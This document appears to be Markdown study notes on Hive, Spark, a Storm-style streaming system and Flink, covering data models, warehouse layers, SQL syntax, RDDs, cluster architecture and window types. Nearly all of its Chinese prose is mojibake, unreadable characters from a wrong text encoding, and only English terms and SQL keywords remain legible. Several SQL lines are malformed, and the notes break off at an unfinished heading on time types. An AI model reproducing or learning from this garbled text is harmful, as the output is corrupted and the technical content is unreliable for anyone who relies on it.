Hiveæ•°æ®æ¨¡å‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151417757.png?token=ARYCSAX53FFMS4HLAGAULR3CQCNU4)\n\n- åˆ†åŒº:æ ¹æ®å­—æ®µå€¼è¿›è¡Œåˆ’åˆ†(æŒ‡å®šåˆ†åŒºå­—æ®µ,åˆ†åŒºå­—æ®µå€¼ç›¸åŒçš„è®°å½•å°±å­˜æ”¾åœ¨ä¸€ä¸€ä¸ªåˆ†åŒºä¸­)\\\nåˆ†åŒºåœ¨ç‰©ç†ä¸Šæ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹\\\nåˆ†åŒºä¸‹è¿˜å¯ä»¥å†æœ‰åˆ†åŒºå’Œæ¡¶\\\nåœ¨åˆ›å»ºè¡¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šåˆ†åŒºå­—æ®µ\\\nåˆ†åŒºæ•°é‡æ˜¯ä¸å›ºå®šçš„\n  \n- æ¡¶:æ ¹æ®å€¼çš„å“ˆå¸Œå€¼è¿›è¡Œæ±‚ä½™æ”¾åˆ°å¯¹åº”çš„æ¡¶ä¸­\\\næ¡¶åœ¨ç‰©ç†.ä¸Šæ˜¯ä¸€-ä¸ªæ–‡ä»¶\\\nåœ¨åˆ›å»ºè¡¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šæœ‰å‡ ä¸ªæ¡¶\n  \n- è¡¨ç±»å‹:æ‰˜ç®¡è¡¨(å†…éƒ¨è¡¨)ã€å¤–éƒ¨è¡¨ã€ä¸´æ—¶è¡¨\\\næ‰˜ç®¡è¡¨(internal) :å…ƒæ•°æ®å’Œæ•°æ®ä¿¡æ¯éƒ½æ˜¯Hiveåœ¨ç®¡ç†\\\n`åˆ é™¤æ—¶ï¼Œå…ƒæ•°æ®å’Œæ•°æ®éƒ½ä¼šè¢«åˆ é™¤\\`\nå¤–éƒ¨è¡¨(external) :å…ƒæ•°æ®ç”±Hiveç®¡ç†,ä½†æ˜¯æ•°æ®å¯ä»¥æä¾›ç»™å…¶ä»–ç»„ä»¶å…±äº«\\\n`åˆ é™¤æ—¶ï¼Œåªåˆ é™¤å…ƒæ•°æ®ï¼Œæ•°æ®ä¿¡æ¯ä¾æ—§ä¿ç•™\\`\nä¸´æ—¶è¡¨(temporary) :åªåœ¨å½“å‰ä¼šè¯ä¸­ç”Ÿæ•ˆï¼Œå½“ä¼šè¯ç»“æŸè¡¨å°±ä¼šè¢«è‡ªåŠ¨åˆ é™¤\n\n## Hiveæ•°æ®ä»“åº“åˆ†å±‚`(é€»è¾‘åˆ†å±‚)`\n- ODS (åŸæ•°æ®å±‚ï¼Œæ“ä½œæ•°æ®å±‚) :ä»æ•°æ®æºè·å–åˆ°çš„æ•°æ®\n- DWD (æ•°æ®æ˜ç»†å±‚) :æ ¹æ®ODSåšæ•°æ®æ¸…æ´—å¾—åˆ°çš„ç»“æœ\n- DWS (æ•°æ®æœåŠ¡å±‚) :æ ¹æ®DWDè¿›è¡Œæ±‡æ€»åˆ†æè®¡ç®—\n- ADS (åº”ç”¨æœåŠ¡å±‚) :æ ¹æ®ä¸Šå±‚åº”ç”¨çš„ä¸šåŠ¡éœ€æ±‚å°†DWSæ•°æ®å†ä¸€æ¬¡å¤„ç†åˆ†æå¾—åˆ°ä¸šåŠ¡ éœ€è¦çš„æ•°æ®\n\n## Hiveçš„åˆ†å±‚å¤„ç†çš„ä¼˜åŠ¿\n- å¤æ‚é—®é¢˜ç®€å•åŒ–:å°†å¤æ‚é—®é¢˜åˆ†æˆå¤šä¸ªæµç¨‹ï¼Œæ¯ä¸ªå±‚é¢æ‰§è¡Œä¸€-ä¸€ä¸ªæµç¨‹å†…å®¹\n- å‡å°‘é‡å¤å¼€å‘:ä¸è¦æ¯æ¬¡æä¾›ç»™ä¸Šæ¬¡åº”ç”¨æ•°æ®æ—¶éƒ½è¦å¯¹æ•°æ®è¿›è¡Œæ¸…æ´—æ±‡æ€»æ“ä½œ\n- éš”ç¦»åŸå§‹æ•°æ®:å‡å°‘åˆ°åŸæ•°æ®çš„ä¾èµ–ï¼Œé¿å…å› ä¸ºåŸæ•°æ®çš„åŸå› ï¼Œå¯¼è‡´åç»­æ“ä½œæ— æ³•æ‰§è¡Œ\n\n\n## Hive SQLçš„ä½¿ç”¨\n```sql\nDDL:æ•°æ®å®šä¹‰è¯­è¨€\n    åˆ›å»ºè¡¨: create table 'è¡¨å(å­—æ®µç±»å‹,å­—æ®µ2ç±»ç±»å‹... .);\n    create external tableè¡¨å'(å­—æ®µç±»å‹,å­—æ®µ2ç±»å‹....\n    create temporary table 'è¡¨å'(å­—æ®µç±»å‹,å­—æ®µ2ç±»å‹... .\n    ä¿®æ”¹è¡¨: alter tableè¡¨å' rename to 'æ–°è¡¨å;\n    alter table 'è¡¨å' addcolumns (å­—æ®µç±»å‹);\n    åˆ é™¤è¡¨: drop table 'è¡¨å';\n    æŸ¥è¯¢æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨: show tables;\n    æŸ¥çœ‹è¡¨ä¿¡æ¯: describe table 'è¡¨å';\n    \nDML:æ•°æ®ç®¡ç†è¯­è¨€\n    æ·»åŠ æ•°æ®:ä»æ–‡ä»¶ä¸­æ·»åŠ åˆ°è¡¨ä¸­\n    load data inpath HDFSè·¯å¾„into tableè¡¨å\n    load data local inpath Linuxè·¯å¾„into tableè¡¨å\n    load data local inpath Linuxè·¯å¾„overwrite into tableè¡¨\n    \n    ä»ä¸€ä¸ªè¡¨æ·»åŠ åˆ°å¦-ä¸€ä¸ªè¡¨ä¸­\n    insert into table è¡¨å select * from åŸè¡¨ whereæ¡ä»¶;\n    from åŸè¡¨ insert into table è¡¨å select * where æ¡ä»¶\n    from åŸè¡¨ insert overwrite table è¡¨å select å­—æ®µ where æ¡ä»¶\n    ä»è¡¨ä¸­å¯¼å‡ºåˆ°æ–‡ä»¶ä¸­\n    insert into directory HDFSè·¯å¾„ select * fromè¡¨\n    insert into local directory Linux è·¯å¾„select * from è¡¨\n    export table è¡¨ to HDFSè·¯å¾„\n    \nDQL:æ•°æ®æŸ¥è¯¢è¯­è¨€\n    æ ‡å‡†æŸ¥è¯¢: select * fromè¡¨å\n    åˆ†ç»„: select * from è¡¨å group byå­—æ®µ\n    æ’åº: select * from è¡¨å order byå­—æ®µdesc\n    å¤šè¡¨è”åˆæŸ¥è¯¢: select * from (select * from è¡¨ a join è¡¨b  on a.id= b.id)\n    \nåˆ›å»ºè¡¨æ—¶çš„ç‰¹æ®Šæ“ä½œ\n    åˆ†åŒº: partitioned (å­—æ®µç±»å‹)\n    æŒ‡å®šåˆ—åˆ†éš”ç¬¦: row format delimited fields terminated by 'åˆ†éš”ç¬¦'\n    æŒ‡å®šå¤–éƒ¨è¡¨çš„å­˜å‚¨è·¯å¾„: location è·¯å¾„\n    æŒ‡å®šå¤–éƒ¨è¡¨çš„å­˜å‚¨ç±»å‹: stored as textfile\n    æŒ‡å®šå­—æ®µåŠ å¯†: ROW FORMAT SERDE\n    'org.apache.hadoop.hive.serde2.lazy.LazySimpleSerDe' WITH SERDEPROPERTIES(\n    'column.encode.columns'='å­—æ®µ1,å­—æ®µ\n    2'column.encode.classname' ='org apache.hadoop.hive.serde2.AESRewriter);\n```\n\n# Spark\n\n## Sparkç‰¹ç‚¹\n    è½»å¿«çµå·§Sparkçš„å¤„ç†èƒ½åŠ›æ˜¯MapReduceçš„30å€ï¼Œå¤„ç†èƒ½åŠ›ä¸å®¹æ˜“å—åˆ°ä»»åŠ¡é‡å¢åŠ çš„å½±å“\nè½»:åº•å±‚ä»£ç åªæœ‰3ä¸‡è¡Œï¼Œä½¿ç”¨çš„å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€scala\nå¿«:å¤„ç†é€Ÿåº¦å¿«\nçµ:æä¾›å¾ˆå¤šä¸åŒå±‚é¢çš„å¤„ç†åŠŸèƒ½\nå·§:å·§å¦™çš„åº”ç”¨Hadoopå¹³å°\n\n\n## RDD:åˆ†å¸ƒå¼æ•°æ®é›†ã€å¯åˆ†åŒºçš„\n- å…·æœ‰è¡€ç»Ÿæœºåˆ¶(RDDç”±çˆ¶RDDæ‰§è¡Œæ“ä½œä¹‹åäº§ç”Ÿ)\n- å¦‚æœå­RDDä¸¢å¤±ï¼ŒRDDæ•…éšœï¼Œé‡æ–°æ‰§è¡Œçˆ¶RDDå°±å¯ä»¥é‡æ–°å¾—åˆ°çš„å­RDD\n- RDDé»˜è®¤å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå¦‚æœå†…å­˜ä¸è¶³çš„æ—¶å€™ï¼Œå‘ç”Ÿæº¢å†™\n- SparkèŠ‚ç‚¹ä¼šåˆ†é…60%çš„å†…å­˜ç”¨äºåšç¼“å­˜ï¼Œ40%æ‰§è¡Œå†…å­˜\n\n\n## ä¾èµ–ç±»å‹\n    å®½ä¾èµ–ã€çª„ä¾èµ–\n- çª„ä¾èµ–:çˆ¶RDDçš„æ¯ä¸ªåˆ†åŒºéƒ½åªä¼šè¢«`ä¸€ä¸ª`å­RDDçš„åˆ†åŒºæ‰€ä¾èµ–\n- å®½ä¾èµ–:çˆ¶RDDçš„æ¯ä¸ªåˆ†åŒºå¯èƒ½ä¼šè¢«`å¤šä¸ªå­RDDçš„åˆ†åŒºæ‰€ä¾èµ–`\n\n## Stageåˆ’åˆ†\n    é‡åˆ°çª„ä¾èµ–å°±åŠ å…¥ï¼Œå®½ä¾èµ–å°±æ–­å¼€ï¼Œå‰©ä½™çš„æ‰€æœ‰RDDè¢«æ”¾åœ¨ä¸€ä¸ªStageä¸­\n\n## RDDæ“ä½œç±»å‹\n- åˆ›å»ºæ“ä½œ:åˆ›å»ºRDDç”¨äºæ¥æ”¶æ•°æ®ç»“æœ\n- åŸå§‹RDD:è¯»å–æ•°æ®æºè·å¾—çš„RDD (readFile(path))\n- è½¬æ¢å¾—æ¥:é€šè¿‡çˆ¶RDDæ‰§è¡Œæ“ä½œåå¾—åˆ°çš„å­RDD\n- æ§åˆ¶æ“ä½œ:æŒä¹…åŒ–RDD,å¯ä»¥æŒä¹…åŒ–åˆ°å†…å­˜æˆ–ç£ç›˜ä¸­,é»˜è®¤å­˜åœ¨å†…å­˜\n- è½¬æ¢æ“ä½œ:å¯å¯¹RDDæ‰§è¡Œçš„å¤„ç†æ“ä½œï¼Œè½¬æ¢æ“ä½œæ˜¯æ‡’æƒ°çš„ï¼Œè½¬æ¢æ“ä½œå¹¶ä¸æ˜¯ç«‹é©¬æ‰§è¡Œï¼Œé‡åˆ°è¡ŒåŠ¨æ“ä½œæ‰æ‰§è¡Œ\n- è¡ŒåŠ¨æ“ä½œ:å®é™…è°ƒç”¨Sparkæ‰§è¡Œ(å­˜å‚¨æ–‡ä»¶,æ•°æ®è¾“å‡ºç­‰)\n\n\n- transformationç®—å­åœ¨æ•´ä¸ªç¨‹åºä¸­ ->å£°æ˜è½¬æ¢æ“ä½œ,å®é™…å¹¶æ²¡æœ‰æ‰§è¡Œ\n- actionç®—å­æ—¶ï¼Œ ä¼šä»ç¬¬ä¸€-ä¸ªæ“ä½œå¼€å§‹æ‰§è¡Œ\n- DataFrame:å±äºä¸€ä¸ªDataSetå®ä¾‹ï¼Œ ä¸å¯å˜çš„å¼¹æ€§åˆ†å¸ƒå¼æ•°æ®é›†ï¼Œå­˜å‚¨æ•°æ®æ—¶ä¸æ­¢å­˜å‚¨æ•°æ®å†…å®¹,å­˜å‚¨æ•°æ®å¯¹åº”ç»“æ„ä¿¡æ¯åŠç±»å‹\n- DataSet:ä»¥å¯¹è±¡çš„å½¢å¼å­˜å‚¨æ•°æ®é›†ï¼ŒDataFrame= DataSet[Row]\n\n## RDDã€DataFrameã€ DataSetæ•°æ®é›†çš„è”ç³»\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418011.png?token=ARYCSAWRARIHVOCZT6NHLH3CQCNVU)\n\n\n## Sparkä½“ç³»æ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418466.png?token=ARYCSAQGUHHKT3TZXELJC7LCQCNWU)\n\n- é›†ç¾¤éƒ¨ç½²å½¢å¼: \\\n  Standalone: sparkè‡ª å·±ç®¡ç†èµ„æºè°ƒåº¦\\\n  Spark On Yarn:ä½¿ç”¨yarnåšèµ„æºç®¡ç†è°ƒåº¦ \\\n  Mesos: AMRå®éªŒå®¤å¼€å‘çš„èµ„æºç®¡ç†å™¨ï¼Œæœ€é€‚ç”¨äºSparkçš„èµ„æºç®¡ç†å™¨\n- Spark Core:å¤„ç†æ ¸å¿ƒ\n- Spark SQL:å¤„ç†ç»“æ„åŒ–æ•°æ®ï¼Œä½¿ç”¨Hiveå…ƒæ•°æ®\n- Spark Streaming:å®æ—¶æµå¤„ç†(å®é™…å¾®æ‰¹å¤„ç†) , èƒ½å¤Ÿä½å»¶è¿Ÿçš„è®¡ç®—åé¦ˆç»“æœ\n- MLLib:æœºå™¨å­¦ä¹ ,æ ¹æ®å†å²æ•°æ®è¿›è¡Œå»ºæ¨¡ï¼Œæ ¹æ®æ¨¡å‹å’Œæä¾›çš„æ•°æ®è¿›è¡Œæ•°æ®é¢„æµ‹\n- GraphX:å›¾è®¡ç®—,ä¸»è¦ç”¨äºå…³ç³»ç»Ÿè®¡,å…³ç³»æŸ¥è¯¢\n- SparkR: Rè¯­è¨€åº“,æä¾›Rè¯­è¨€æ¥å£ï¼Œå¯ä»¥ä½¿ç”¨Rè¯­è¨€æ“ä½œSpark\n- Structured Streaming:æµå¤„ç†ï¼Œå°†æ•°æ®å­˜å…¥-ä¸ªæ— è¾¹ç•Œè¡¨(æ–°æ•°æ®ä¸æ–­æ·»åŠ ï¼Œæ—§æ•°æ®ä¸æ–­ç§»é™¤)ä½¿ç”¨å¢é‡çš„æ–¹å¼è·å–è¡¨æ•°æ®å†…å®¹è¿›è¡Œæ‰§è¡Œ\n\n\n# Streaming\n    åˆ†å¸ƒå¼æµå¤„ç†ç»„ä»¶\n\n## å…³é”®ç‰¹æ€§:å®æ—¶å“åº”ï¼Œå»¶è¿Ÿæ€§ä½\n- æ•°æ®ä¸å­˜å‚¨å…ˆæ‰§è¡Œ(ç¦»çº¿å¤„ç†å…ˆå­˜å‚¨æ•°æ®ç„¶åå†æ‰§è¡Œ)\n- è¿ç»­æŸ¥è¯¢(ç¨‹åºè¿è¡Œåå°±ä¸ç»ˆæ­¢,é™¤éç³»ç»Ÿæ•…éšœå¯¼è‡´çš„ç»ˆæ­¢æˆ–è€…æ‰‹åŠ¨åœæ­¢)\n- äº‹ä»¶é©±åŠ¨:ä¼ å…¥çš„æ•°æ®ä¿¡æ¯è§¦åŠ¨ä»»åŠ¡å¤„ç†\n\n\n## Streamingç³»ç»Ÿæ¶æ„\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418540.png?token=ARYCSAXAP6TJ6NCOI5DFBPDCQCNXE)\n\n- Client:å®¢æˆ·ç«¯æ¥å£\n- Nimbus (ä¸»èŠ‚ç‚¹) :æ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œç®¡ç†Supervisorä»èŠ‚ç‚¹ï¼Œç®¡ç†ä»»åŠ¡åˆ†é…ï¼Œç¼–å†™ä»»åŠ¡ä¹¦\n- Supervisor (ä»èŠ‚ç‚¹) :å®è¡Œä»»åŠ¡ï¼Œç®¡ç†worker\n- Worker (è¿›ç¨‹) :ç¨‹åºæ‰§è¡Œ\n- Executor (çº¿ç¨‹) :æ¯ä¸ªExecutorä¸­é»˜è®¤æ‰§è¡Œä¸€ ä¸€ä¸ªTask\n- Task (ä»»åŠ¡) : Taskåˆ†åˆ«å¯¹åº”æ¯ä¸€ ä¸ªSpout/Boltç»„ä»¶çš„æ‰§è¡Œ \n- ZooKeeper:ç›‘æ§Nimbusä¸»èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œå¦‚æœä¸»èŠ‚ç‚¹æ•…éšœåˆ‡æ¢å¤‡ç”¨èŠ‚ç‚¹\\\nç›‘æ§Supervisorä»èŠ‚ç‚¹çŠ¶æ€ï¼Œå¦‚æœä»èŠ‚ç‚¹æ•…éšœ,é€šçŸ¥Nimbusè¿ç§»ä»»åŠ¡ï¼Œå¯åŠ¨è‡ªåŠ¨æ¢å¤\\\næ¥æ”¶Nimbusä»»åŠ¡ä¹¦ï¼Œå°†æ¯ä¸ªä»èŠ‚ç‚¹çš„ä»»åŠ¡å­˜æ”¾åœ¨æ¯ä¸ªSupervisorè‡ªå·±å¯¹åº”çš„ç›®å½•ä¸­\n\n\n## Streamingä»»åŠ¡æ¶æ„\n- Topology:æ‹“æ‰‘ç»“æ„,å°è£…ä»»åŠ¡æ‰§è¡Œæµç¨‹\n- Spout:å‘é€æ•°æ®æºçš„ç»„ä»¶,æ¥æ”¶ç¬¬ä¸‰æ–¹æ•°æ®æ”¶é›†Iå…·æä¾›çš„æ•°æ®å‘é€åˆ°æ•°æ®æµ\n- æ¯ä¸ªåº”ç”¨åªæœ‰ä¸€ä¸ªspout\n- Bolt:ä»æ•°æ®æµä¸­è·å–æ•°æ®,æ‰§è¡Œæ•°æ®å¤„ç†ï¼Œå¦‚æœå½“å‰boltä¸æ˜¯æœ€å-ä¸ªæ‰§è¡Œç¨‹åºå°†ç»“æœæ”¾å›æ•°æ®æµä¸€ä¸ªåº”ç”¨ä¸­å¯ä»¥æœ‰å¤šä¸ªbolt\n- Tuple:æ•°æ®æµä¸­çš„æ•°æ®æ ¼å¼ï¼Œç»„ä»¶ä¹‹é—´æ•°æ®ä¼ è¾“çš„æ ¼å¼ï¼Œå…ƒç»„ä¸­åŒ…å«ä¸¤ä¸ªå‚æ•°(id, stream)\n\n## Streamingæ‰§è¡Œä»»åŠ¡\n1. ç”¨æˆ·é€šè¿‡Clientæäº¤åº”ç”¨åˆ°Nimbusä¸­\n2. Nimbusæ¥æ”¶åˆ°åº”ç”¨åï¼Œæ ¹æ®åº”ç”¨æƒ…å†µåŠå½“å‰é›†ç¾¤çš„ä»èŠ‚ç‚¹æƒ…å†µç¼–å†™ä»»åŠ¡ä¹¦\n3. å°†ä»»åŠ¡ä¹¦.ä¸Šä¼ åˆ°ZooKeeperä¸­\n4. ZooKeeperæ¥æ”¶åˆ°ä»»åŠ¡ä¹¦åæ ¹æ®æ¯ä¸ªèŠ‚ç‚¹å°†å¯¹åº”çš„ä»»åŠ¡å­˜æ”¾åœ¨èŠ‚ç‚¹å¯¹åº”çš„ç›®å½•ä¸‹\n5. Supervisorå‘¨æœŸæ€§ç›‘æµ‹è‡ªå·±åœ¨ZooKeeperä¸­çš„ç›®å½•æœ‰æ²¡æœ‰æ–°ä»»åŠ¡\n6. Supervisorå‘ç°æ–°ä»»åŠ¡ï¼Œæ ¹æ®ä»»åŠ¡ä¹¦å†…å®¹ä»Nimbusä¸­ä¸‹è½½ä»»åŠ¡æ‰€éœ€è¦çš„jaråŒ…\n7. Supervisoræ‰§è¡Œä»»åŠ¡,åé¦ˆæ‰§è¡ŒçŠ¶æ€ç»™Nimbus .\n8. Nimbuså°†ä»»åŠ¡çŠ¶æ€åé¦ˆç»™Client\n\n\n## æ ¹æ®ä»»åŠ¡æ¶æ„æ‰§è¡Œ\n1. è·å–æ‹“æ‰‘ç»“æ„\n2. æ ¹æ®æ‹“æ‰‘ç»“æ„åˆ†åˆ«æ‰¾åˆ°æ¯ä¸€æµç¨‹çš„å¤„ç†å•å…ƒ\n3. æŒ‰ç…§è·¯ç¨‹æ‰§è¡Œå¤„ç†å•å…ƒ\n\n## æ¶ˆæ¯ä¼ é€’è¯­ä¹‰\n- æœ€å¤šä¸€æ¬¡:æ•°æ®å‘é€åªå‘é€ä¸€æ¬¡, å¯é æ€§æœ€ä½ï¼Œååé‡æœ€å¤§\\\n    ç¼ºç‚¹:å¯èƒ½å­˜åœ¨æ•°æ®ä¸¢å¤±çš„æƒ…å†µ\\\n    ä¼˜ç‚¹:æ•°æ®ä¸€å®šä¸ä¼šè¢«é‡å¤æ‰§è¡Œ\n- æœ€å°‘ä¸€æ¬¡:æ•°æ®å¯èƒ½ä¼šå‘é€å¤šæ¬¡ï¼Œå¯é æ€§é«˜ï¼Œååé‡è¾ƒå°\\\n    ä¼˜ç‚¹:æ•°æ®ä¸ä¼šä¸¢å¤±\\\n    ç¼ºç‚¹:æ•°æ®å¯èƒ½ä¼šè¢«é‡å¤æ‰§è¡Œ\n- ä»…æœ‰ä¸€æ¬¡(ç²¾å‡†ä¸€æ¬¡) :æ•°æ®å°±å‘é€ä¸€-æ¬¡, å¹¶ä¸”ä¿è¯å‘é€æˆåŠŸï¼Œå¯é æ€§é«˜ï¼Œååé‡æœ€ä½\\\n    ä¼˜ç‚¹:æ•°æ®ä¸ä¼šä¸¢å¤±ï¼Œä¸”æ•°æ®ä¸è¢«é‡å¤å¤„ç†\\\n    ç¼ºç‚¹:æ¶ˆè€—çš„èµ„æºå’Œæ—¶é—´è¾ƒå¤š\n\n## Ackæœºåˆ¶(æ¶ˆæ¯ä¼ è¾“æœ€å°‘ä¸€æ¬¡)\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418753.png?token=ARYCSAWRFRIHBUCJJK33MJLCQCNXY)\n\n\n\n# Flink\n    åˆ†å¸ƒå¼å®æ—¶è®¡ç®—å¼•æ“(æµå¤„ç†å¼•æ“)\n\n\n## Flink VS Spark Streaming\n- Flinkå¯ä»¥åšæµå¤„ç†(ä¾§é‡)ä¹Ÿå¯ä»¥åšæ‰¹å¤„ç†ï¼Œåº•å±‚å¼•æ“å±äºæµå¤„ç†å¼•æ“\n- é€šè¿‡æµå¤„ç†å¼•æ“æ¨¡æ‹Ÿæ‰¹å¤„ç†å½¢å¼å®ç°çš„æ‰¹å¤„ç†\n- Sparkå¯ä»¥åšæµå¤„ç†ä¹Ÿå¯ä»¥åšæ‰¹å¤„ç†(ä¾§é‡ç‚¹)ï¼Œåº•å±‚å¼“|æ“å±äºæ‰¹å¤„ç†å¼•æ“\n- é€šè¿‡æ‰¹å¤„ç†å¼•æ“,æ¨¡æ‹Ÿæµå¤„ç†å®ç°çš„æµå¤„ç†åŠŸèƒ½\n\n## Flinkçš„å…³é”®ç‰¹æ€§\n    çŠ¶æ€ã€æ—¶é—´ã€çª—å£ã€æ£€æŸ¥ç‚¹\n\n\n## Flinkç³»ç»Ÿæ¶æ„\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151418648.png?token=ARYCSAX4VBWVPDPE5COHNI3CQCNY4)\n\n- éƒ¨ç½²å½¢å¼: Local (å•æœºç‰ˆéƒ¨ç½²)\\\n    Cluster (Standalone: Flinké›†ç¾¤è‡ªå·±ç®¡ç†èµ„æºè°ƒåº¦\\\n    Yarn:å€ŸåŠ©Yarnç»„ä»¶å¸®åŠ©ç®¡ç†åè°ƒèµ„æºå’Œä»»åŠ¡)\\\n    Clound (äº‘éƒ¨ç½²)\n- Flinkæ ¸å¿ƒæ¨¡å—: Runtime (ä¸ç®¡æ˜¯æµå¤„ç†è¿˜æ˜¯æ‰¹å¤„ç†éƒ½æ˜¯åœ¨Runtimeä¸­æ‰§è¡Œ)\n- æ¥å£å±‚: DataStream (æµå¤„ç†)å’ŒDataSet (æ‰¹å¤„ç†)\n- Table API & SQL:å¤„ç†ç»“æ„åŒ–æ•°æ®\n```sql\nTable API:å°†æ“ä½œåº”ç”¨å°è£…æˆæ–¹æ³•\n    select(\"t_ demo \").where(\"æ¡ä»¶\")\n    \nSQL:åŸºäºTable APIä½¿ç”¨ï¼Œ\n    sqlQuery(\"select * from t_ demo whereæ¡ä»¶\")\n```\n\n## æœ‰ç•Œæµå’Œæ— ç•Œæµ\n- æœ‰ç•Œæµ:çŸ¥é“å¼€å§‹ï¼ŒçŸ¥é“ç»“æŸï¼Œä½¿ç”¨æ‰¹å¤„ç†å¤„ç†æœ‰ç•Œæµæ•°æ®.\n- æ— ç•Œæµ:çŸ¥é“å¼€å§‹ï¼Œä¸çŸ¥é“ç»“æŸï¼Œä½¿ç”¨æµå¤„ç†æ¥å£è¿›è¡Œæ•°æ®å¤„ç†\n\n## DataStream:ç”¨äºå­˜å‚¨æ•°æ®çš„æ•°æ®é›†ï¼Œåªèƒ½æ‰§è¡Œæµå¤„ç†æ“ä½œ\n- åŸºäºæµå¤„ç†è¿è¡Œç¯å¢ƒè·å–åˆ°çš„æ•°æ®\n\n## DataSet:ç”¨æ¥æ¥æ”¶æ•°æ®çš„æ•°æ®é›†ï¼Œåªèƒ½æ‰§è¡Œæ‰¹å¤„ç†æ“ä½œ\n- åŸºäºæ‰¹å¤„ç†è¿è¡Œç¯å¢ƒè·å–åˆ°çš„æ•°æ®\n\n`å¹¶ä¸èƒ½åœ¨ä¸€ä¸ªåº”ç”¨ä¸­åŒæ—¶æ¥æ”¶æµå¤„ç†å’Œæ‰¹å¤„ç†æ¥å£ï¼Œä»¥æ­¤å®ç°æµå¤„ç†å’Œæ‰¹å¤„ç†çš„å…±ç”¨`\n\n\n## Flinkè¿è¡Œæµç¨‹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151419908.png?token=ARYCSARE4QYFZKKQ3RJCOTLCQCN2A)\n\n1. DataSource:æ¥æ”¶æ•°æ®è¾“å…¥ï¼Œä»æ•°æ®æºè·å–æ•°æ®\n2. Transformations:æ•°æ®è½¬æ¢ï¼Œæ•°æ®å¤„ç†è¿‡ç¨‹\n3. DataSink:å°†æœ€ç»ˆæ•°æ®ç»“æœè¾“å‡ºåˆ°æŒ‡å®šä½ç½®(å¦‚HDFSã€ HBaseã€ æ–‡ä»¶ã€æ•°æ®åº“ç­‰)\n\n## Flinkç¨‹åºè¿è¡Œæµç¨‹\n`1. åˆ›å»ºè¿è¡Œç¯å¢ƒæµå¤„ç†/æ‰¹å¤„ç†`\n2. é€šè¿‡è¿è¡Œç¯å¢ƒå¯¹è±¡è·å–æ•°æ®æºæ•°æ®(DataStream/DataSet)\n3. é’ˆå¯¹æ•°æ®é›†è¿›è¡Œæ•°æ®è½¬æ¢\n4. å°†æœ€ç»ˆç»“æœè¿›è¡Œè¾“å‡º(æ‰¹å¤„ç†çš„printç®—å­)\n`5. æœ€åæ‰§è¡Œç¨‹åº(è¡ŒåŠ¨ç®—å­) executor()`\n\n## Flinkè¿è¡Œç¨‹åº\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151420112.png?token=ARYCSARQSJHF2WMKPMIWLCTCQCN6E)\n\n1. Clientå‘JobManagerå‘èµ·è¯·æ±‚\n2. Clientå¯¹ä»»åŠ¡è¿›è¡Œä¼˜åŒ–ç­‰æ“ä½œ\n3. JobManageråˆ†é…ä»»åŠ¡ç»™TaskManager\n4. TaskManageræ¥æ”¶åˆ°ä»»åŠ¡åæ‰§è¡Œä»»åŠ¡\n5. TaskManageråé¦ˆä»»åŠ¡æ‰§è¡ŒçŠ¶æ€ç»™JobManager\n6. JobManagerç»Ÿä¸€åé¦ˆç»™ç”¨æˆ·\n\n- Flink Client:ç”¨æˆ·é€šè¿‡Clientè¿æ¥åˆ°JobManager\n- JobManager (ä¸»èŠ‚ç‚¹) :æ¥æ”¶ç”¨æˆ·è¯·æ±‚ï¼Œç®¡ç†èµ„æºä»»åŠ¡åˆ†é…ï¼Œç®¡ç†ä»èŠ‚ç‚¹ä¿¡æ¯\n- TaskManager (ä»èŠ‚ç‚¹) :æ¥æ”¶ä»»åŠ¡å¤„ç†ä»»åŠ¡ï¼Œåé¦ˆç»™ä¸»èŠ‚ç‚¹\n- Standaloneéƒ¨ç½²:åˆ›å»ºTask Slot: Flinkçš„æŠ½è±¡èµ„æº\n\n## FlinkçŠ¶æ€\n    åŒºåˆ«äºå…¶ä»–ç»„ä»¶çš„ä¸€-ä¸ªç‰¹æ€§ï¼Œæ”¯æŒçŠ¶æ€ç®¡ç†(ä¸­é—´ç»“æœçŠ¶æ€)\n\n## Finkçª—å£ç±»å‹\n- æ»‘åŠ¨çª—å£: çª—å£ç§»åŠ¨æ–¹å¼æ˜¯å¹³ç§»,è®¾å®šå‚æ•°æ—¶éœ€è¦è®¾å®šçª—å£å¤§å°,æ»‘åŠ¨è·ç¦».çª—å£å¤§å°å›ºå®š,å¯èƒ½ä¼šå‡ºç°æ•°æ®æºé‡å¤å’Œæ•°æ®ä¸¢å¤±çš„æƒ…å†µ\n- æ»šåŠ¨çª—å£: çª—å£ç§»åŠ¨æ–¹å¼æ»šåŠ¨,æ»šåŠ¨è·ç¦»å°±æ˜¯çª—å£å¤§å°,è®¾å®šçª—å£æ—¶åªéœ€è¦è®¾å®šçª—å£å¤§å°.çª—å£å¤§å°å›ºå®š,ä¸ä¼šå‡ºç°æ•°æ®é‡å¤æˆ–è€…æ•°æ®ä¸¢å¤±çš„æƒ…å†µ,ä¼šå‡ºç°ç©ºçª—å£çš„æƒ…å†µ\n- ä¼šè¯çª—å£: ç”±ä¼šè¯å¯åŠ¨çš„çª—å£,è®¾å®šè¿‡æœŸæ—¶é—´,çª—å£ä»£é”€ä¸å›ºå®š,è¿è¡Œæ—¶ä¸ä¼šæœ‰ä¸¢å¤±çš„æ•°æ®,ä¸ä¼šå‡ºç°ç©ºçª—å£\n- æ—¶é—´çª—å£: ä»¥æ—¶é—´ä¸ºæ¡ä»¶è®¾å®šçš„çª—å£,`åˆ†åˆ«å¯ä»¥å†åˆ†ä¸ºæ»‘åŠ¨æˆ–æ»šåŠ¨`\n- æ•°é‡çª—å£: ç”±ä¼šè¯å¯åŠ¨çš„çª—å£,è®¾å®šè¿‡æœŸæ—¶é—´,`åˆ†åˆ«å¯ä»¥å†åˆ†ä¸ºæ»‘åŠ¨æˆ–æ»šåŠ¨`\n\n## Finkçš„æ—¶é—´ç±»å‹\n- æ—¶é—´ç±»å‹: 